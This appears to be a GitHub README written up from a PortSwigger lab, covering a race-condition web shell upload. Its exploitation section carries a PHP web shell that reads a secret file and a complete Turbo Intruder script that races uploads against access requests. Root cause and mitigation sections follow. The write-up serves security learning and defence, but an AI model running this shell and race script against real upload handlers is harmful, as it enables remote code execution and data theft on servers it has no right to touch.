# Web Shell Upload via Race Condition

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Security Research](https://img.shields.io/badge/Security-Research-blue.svg)](https://github.com/yourusername/web-shell-race-condition)

A detailed analysis and demonstration of a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability in web file upload mechanisms, leading to remote code execution (RCE). This project serves as a professional portfolio piece showcasing vulnerability research, exploitation techniques, and security best practices.

## Table of Contents

- [Overview](#overview)
- [Vulnerability Details](#vulnerability-details)
- [Root Cause Analysis](#root-cause-analysis)
- [Exploitation](#exploitation-assessment)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [Mitigation Strategies](#mitigation-strategies)
- [Tools and Resources](#tools-and-resources)
- [References](#references)

## Overview

Modern web applications often implement multi-stage file upload processing: accepting files, storing them temporarily or permanently on disk, and then performing security checks such as antivirus scanning, content-type verification, and extension validation. When these checks occur after the file has been written to its final disk location—especially in directories where execution is permitted—a classic TOCTOU race condition emerges. During the brief interval between file creation and validation completion, the uploaded content is live on the filesystem and potentially executable by the web server.

This vulnerability allows attackers to exploit a narrow timing window by racing multiple simultaneous uploads and attempting immediate access to the presumed final path. If successful, arbitrary code execution becomes possible, transforming what appears to be a robust, defense-in-depth upload handler into a critical RCE vector.

This is particularly dangerous in applications that rely on post-write validation rather than pre-write filtering, highlighting how concurrency assumptions can undermine otherwise strong security controls.

## Vulnerability Details

- **CVE Reference**: N/A (Demonstration based on PortSwigger Web Security Academy Lab)
- **Vulnerability Type**: Race Condition (TOCTOU)
- **Severity**: Critical (CVSS Score: 9.8/10)
- **Affected Components**: File upload handlers with asynchronous validation

## Root Cause

The root cause stems from improper sequencing in the file upload workflow:

- **Premature File Placement**: The file is moved to its final location using `move_uploaded_file()` before validation functions are executed.
- **Lack of Synchronization**: No file-level locking, atomic rename, or pre-write temporary isolation mechanisms are implemented.
- **Asynchronous Cleanup**: Deletion or cleanup logic is asynchronous or delayed relative to file availability on the filesystem.

This creates a window where the malicious file exists in an executable state before security checks complete.

## Exploitation Assessment

The exploitation leverages a race condition between file upload and validation/cleanup. Here's a step-by-step assessment:

1. **Initial Reconnaissance**:
   - I logged in as a standard user (wiener) and navigated to the account settings page with image upload functionality and observed that the application accepts image files (PNG/JPG) for avatar uploads:
<img width="818" height="620" alt="image" src="https://github.com/user-attachments/assets/26ef6658-6418-4630-b626-4f0034bd34b9" />
<img width="812" height="656" alt="image" src="https://github.com/user-attachments/assets/be2a6aa7-36a6-47b9-b82e-16a0d9e0f602" />
<img width="1152" height="620" alt="image" src="https://github.com/user-attachments/assets/c6c6e606-1a28-4338-8f7d-61aed6f580ee" />
<img width="849" height="671" alt="image" src="https://github.com/user-attachments/assets/d4cd51cf-db08-4467-8b7a-b827fee895b7" />
<img width="391" height="189" alt="image" src="https://github.com/user-attachments/assets/2bd2e790-5c32-4e54-b7c4-ea626640f4d4" />
<img width="1024" height="654" alt="image" src="https://github.com/user-attachments/assets/45863b66-01ca-4194-b005-aa9bb9e32691" />


2. **Direct Upload Attempts**:
   - I then attempted to upload a malicious PHP file directly, which was blocked (403 Forbidden), confirming extension-based filtering and tested bypass techniques such as path traversal and file obfuscation, but these failed or resulted in temporary acceptance without execution.
<img width="797" height="650" alt="image" src="https://github.com/user-attachments/assets/4f47f1cc-66f7-4d1c-ada6-6d392c2e73de" />
<img width="868" height="311" alt="image" src="https://github.com/user-attachments/assets/415aa603-7755-40d8-9a25-97f7e1b7cece" />
<img width="1365" height="734" alt="image" src="https://github.com/user-attachments/assets/aa961478-7ab1-4caa-a069-1ad0e061d660" />
<img width="1355" height="687" alt="image" src="https://github.com/user-attachments/assets/ae7ac93b-1795-49c6-90f0-52bccc5f3d2a" />

3. **Race Condition Identification**:
   - I discovered that file obfuscation tricks were accepted (200 OK), but appending malicious content to GET requests failed (400 Bad Request).
   - Key insight: The server temporarily saves the image before validation, creating a tiny race window for execution before deletion:
<img width="1363" height="660" alt="image" src="https://github.com/user-attachments/assets/e1b6282b-51b0-45fc-909c-0bb442a4e381" />
<img width="1363" height="686" alt="image" src="https://github.com/user-attachments/assets/1ddad1bc-ea8d-4f29-9908-1f2ce974d946" />


4. **Automated Exploitation Setup**:
   - Used Turbo Intruder (Burp Suite extension) to test for race conditions.
   - Crafted a Python script to send concurrent requests:
     - **Request 1 (Upload)**: POST request uploading a malicious PHP file (`malicious.php`) containing `<?php system('cat /home/carlos/secret');?>`.
     - **Request 2 (Access)**: Multiple GET requests attempting to access `/files/avatars/malicious.php` immediately after upload.
<img width="1357" height="731" alt="image" src="https://github.com/user-attachments/assets/d01d01be-fda2-4de3-a91a-8606437cbbef" />

5. **Script Mechanics**:
   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)

       request1 = '''POST /my-account/avatar HTTP/2
       Host: 0a3c0092044a1217816743350047009e.web-security-academy.net
       Cookie: session=WtRjYg05YbFMH4cqjBCmTCtPBFzsXvYA
       User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
       Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
       Accept-Language: en-US,en;q=0.5
       Accept-Encoding: gzip, deflate, br
       Content-Type: multipart/form-data; boundary=---------------------------132848000320705050624022547058
       Content-Length: 541
       Origin: https://0a3c0092044a1217816743350047009e.web-security-academy.net
       Referer: https://0a3c0092044a1217816743350047009e.web-security-academy.net/my-account
       Upgrade-Insecure-Requests: 1
       Sec-Fetch-Dest: document
       Sec-Fetch-Mode: navigate
       Sec-Fetch-Site: same-origin
       Sec-Fetch-User: ?1
       Priority: u=0, i
       Te: trailers

       -----------------------------132848000320705050624022547058
       Content-Disposition: form-data; name="avatar"; filename="malicious.php"
       Content-Type: application/x-php

       <?php system('cat /home/carlos/secret');?>

       -----------------------------132848000320705050624022547058
       Content-Disposition: form-data; name="user"

       wiener
       -----------------------------132848000320705050624022547058
       Content-Disposition: form-data; name="csrf"

       1ppBBRX7Kx1US0zGcExvWznjlWGiu4YX
       -----------------------------132848000320705050624022547058--
       '''

       request2 = '''GET /files/avatars/malicious.php HTTP/2
       Host: 0a3c0092044a1217816743350047009e.web-security-academy.net
       Cookie: session=WtRjYg05YbFMH4cqjBCmTCtPBFzsXvYA
       User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
       Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
       Accept-Language: en-US,en;q=0.5
       Accept-Encoding: gzip, deflate, br
       Referer: https://0a3c0092044a1217816743350047009e.web-security-academy.net/my-account
       Sec-Fetch-Dest: image
       Sec-Fetch-Mode: no-cors
       Sec-Fetch-Site: same-origin
       Priority: u=5, i
       Te: trailers

       '''

       engine.queue(request1, gate='race1')
       for x in range(5):
           engine.queue(request2, gate='race1')

       engine.openGate('race1')
       engine.complete(timeout=60)

   def handleResponse(req, interesting):
       table.add(req)
   ```

6. **Execution and Success**:
   - The script sends 1 upload request and 5 concurrent access requests.
   - The 'gate' mechanism ensures all requests are queued and released simultaneously, maximizing the race condition window.
   - I finally Successfully exploitated the race condition with at least one GET request hit the server before the malicious file was deleted.
   - Result: I exfiltrated Carlos's secret, proving the race condition via web shell upload.
<img width="1363" height="732" alt="image" src="https://github.com/user-attachments/assets/3acd50a4-fd74-4483-b0a9-623f4f48c3d1" />
<img width="913" height="499" alt="image" src="https://github.com/user-attachments/assets/d4fc7d25-c6ef-4beb-b5ea-56417608b79d" />
<img width="1295" height="614" alt="image" src="https://github.com/user-attachments/assets/03159d1f-7602-4724-aa0a-cfc5a30681a5" />

### Technical Assessment

- **Race Window Duration**: Extremely narrow (milliseconds), requiring high concurrency and precise timing.
- **Success Rate**: Variable; multiple attempts may be needed. In this case, 3 out of 5 GET requests succeeded.
- **Concurrency Requirements**: 10 concurrent connections proved effective for this scenario.
- **Detection Evasion**: The attack mimics legitimate user behavior, making it hard to detect via traditional WAF rules.

## Impact

This vulnerability has severe security implications:

- **Remote Code Execution (RCE)**: Attackers can execute arbitrary code on the server, potentially leading to full system compromise.
- **Data Breach**: Sensitive information can be exfiltrated, as demonstrated by accessing `/home/carlos/secret`.
- **Privilege Escalation**: Depending on server configuration, RCE could allow lateral movement or privilege escalation.
- **Service Disruption**: Malicious code execution could lead to denial-of-service or data corruption.


In production environments, this could affect millions of users if exploited on popular web applications.

## Conclusion

This exploitation demonstrates the critical importance of proper sequencing in security-critical operations. The TOCTOU race condition vulnerability highlights how even well-intentioned security measures can be bypassed when concurrency is not properly managed.

Key lessons learned:
- **Validation Timing**: Always perform security checks before file placement in executable directories.
- **Concurrency Awareness**: Race conditions must be considered in multi-threaded or asynchronous environments.
- **Defense in Depth**: Multiple layers of security are essential, but their implementation order matters.
- **Testing**: Automated tools like Turbo Intruder are invaluable for identifying timing-based vulnerabilities.

This project serves as a practical example of offensive security research, emphasizing the need for rigorous security testing and the potential consequences of overlooked concurrency issues. By understanding and mitigating such vulnerabilities, developers can build more resilient web applications.

## Mitigation Strategies

- **Pre-Write Validation**: Perform all security checks in memory or in a non-executable temporary directory before any disk write operations.
- **Secure File Storage**: Store user-uploaded files in directories without script execution permissions.
- **Atomic Operations**: Use atomic file operations and proper locking mechanisms to prevent race conditions.
- **Rate Limiting**: Implement rate-limiting or request queuing on upload endpoints to reduce the feasibility of race condition exploits.
- **Content-Disposition Headers**: Set appropriate headers to prevent direct execution of uploaded files.
- **Monitoring**: Implement logging and monitoring for unusual upload patterns.

## Tools and Resources

- **Burp Suite Community Edition**: For intercepting, modifying HTTP requests, and using Turbo Intruder extension.
- **PortSwigger Web Security Academy**: Lab environment for practicing web security vulnerabilities.
- **Turbo Intruder**: Specialized tool for testing race conditions and other timing-based attacks.

## References

- [PortSwigger Web Security Academy - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [TOCTOU Race Conditions](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
